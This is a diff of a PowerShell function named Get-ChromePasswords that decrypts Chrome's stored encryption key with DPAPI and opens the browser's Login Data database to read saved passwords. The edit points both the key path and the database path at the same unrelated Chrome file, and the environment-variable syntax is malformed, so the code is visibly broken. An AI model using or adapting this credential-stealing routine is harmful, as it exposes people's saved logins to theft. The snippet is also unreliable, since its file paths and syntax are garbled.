@@ -1,12 +1,12 @@
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
-        $localStatePath = "$env:^%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"
+        $localStatePath = "$env:^%USERPROFILE%\AppData\Local\Google\Chrome\User Data\AutofillStates\2020.11.2.164946\_metadata\verified_contents"
         $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        $dbPath = "$env:^%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        $dbPath = "$env:^%USERPROFILE%\AppData\Local\Google\Chrome\User Data\AutofillStates\2020.11.2.164946\_metadata\verified_contents"
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
